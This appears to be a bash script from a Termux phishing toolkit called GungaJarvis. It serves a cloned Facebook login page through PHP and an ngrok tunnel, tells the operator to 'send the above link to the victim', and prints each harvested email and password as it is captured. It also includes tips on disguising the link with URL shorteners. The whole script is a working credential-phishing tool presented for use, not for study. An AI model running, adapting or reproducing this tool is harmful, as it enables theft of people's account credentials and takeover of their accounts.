#! /data/data/com.termux/files/usr/bin/bash
clear
arr[0]='\nCaution: More than 50 gmails and 50 passwords are not stored, for storage purposes.\n\n'
arr[1]='\nCaution: You cannot use a single server for many victims.\n\n'
arr[2]='\nTip: You can use "short urls" to change your ngrok url.\n\n'
arr[3]='\nCaution: Dont rename your files.\n\n'
arr[4]='\nCaution: Dont move GungaJarvis to any other directory other than "home".\n\n'
rand=$[ $RANDOM % 5 ]
echo -e "${arr[$rand]}"
sleep 4

check_files() {
clear
cd $HOME/GungaJarvis/utils/phishing/websites/facebook/
if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && -e facebook.sh && ip.php && ip.txt ]]; then
echo '' >/dev/null 2>&1
else
bash $HOME/GungaJarvis/update
echo 'Please Restart GungaJarvis'
fi
}
check_files

stop() {
echo -e 'Stopping the server'
killall ngrok
echo ''
echo -e 'Ngrok stopped...'
killall php
echo -e 'Php stopped...'
}

requirements() {
clear
command -v php > /dev/null 2>&1 || { echo >&2 "php is required which is not installed, Please install it. Exiting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip command is required which is not installed, Please install it. Exiting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required which is not installed, Please install it. Exiting."; exit 1; }
}
requirements

check_ngrok() {
clear
cd $HOME
if [[ -f ngrok ]]; then
echo ''
else
echo "ngrok is not in your home directory, install it or move to your home directory"
exit 0
#read -p $'Do you want to download ngrok [y/n]: ' d_ngrok
#   if [[ $d_ngrok == 'y' ]]; then #3
#arch=$(uname -a | grep -o 'arm' | head -n1)
#arch2=$(uname -a | grep -o 'Android' | head -n1)
#      if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then #4
#cd $HOME
#wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
#         if [[ -e ngrok-stable-linux-arm.zip ]]; then #5
#echo -e 'Downloaded successfully'
#unzip ngrok-stable-linux-arm.zip
#chmod +x ngrok
#echo "authenticate your ngrok account, EXITING"
#exit 0
#else #5
#echo -e 'Error while downloading.........'
#sleep 3.0
#exit 1
#fi #5
#else #4
#wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
#         if [[ -e ngrok-stable-linux-386.zip ]]; then #6
#unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
#chmod +x ngrok
#else #6
#echo -e 'Error while downloading..........'
#exit 1
#fi
#fi
#fi
fi
}
check_ngrok

start_server() {
clear
echo -e 'Starting server....'
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 5
echo -e '\nPhp started'
cd $HOME
./ngrok http 3333 >/dev/null 2>&1 &
sleep 5
echo -e '\nNgrok started'
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
before_gmail=$(wc -l < gmail.txt)
before_pass=$(wc -l < pass.txt)
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
echo -e '\n\n'
echo 'Ngrok link: ' $link
echo 'send the above link to the victim'
echo -e '\n\n'
}
start_server

transfer_items() {
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
while true
do
after_gmail=$(wc -l < gmail.txt)
after_pass=$(wc -l < pass.txt)
if [[ $after_gmail -gt $before_gmail && $after_pass -gt $before_pass ]]; then
echo ''
clear
echo -e 'Credentials found....'
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
echo -e '\n\n'
echo 'Gmail: ' $(cat gmail.txt | tail -1)
echo ''
echo 'Password ' $(cat pass.txt | tail -1)
echo -e '\n\n'
break
else
echo '' >/dev/null
fi
done
}
transfer_items

cleaner() {
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
while true
do
gmail_cleaner=$(wc -l < gmail.txt)
until [ $gmail_cleaner -le 50 ]
do
sed -i '1d' gmail.txt
$gmail_cleaner-=1
done
pass_cleaner=$(wc -l < pass.txt)
until [ $pass_cleaner -le 50 ]
do
sed -i '1d' pass.txt
done
break
done
}
cleaner
stop
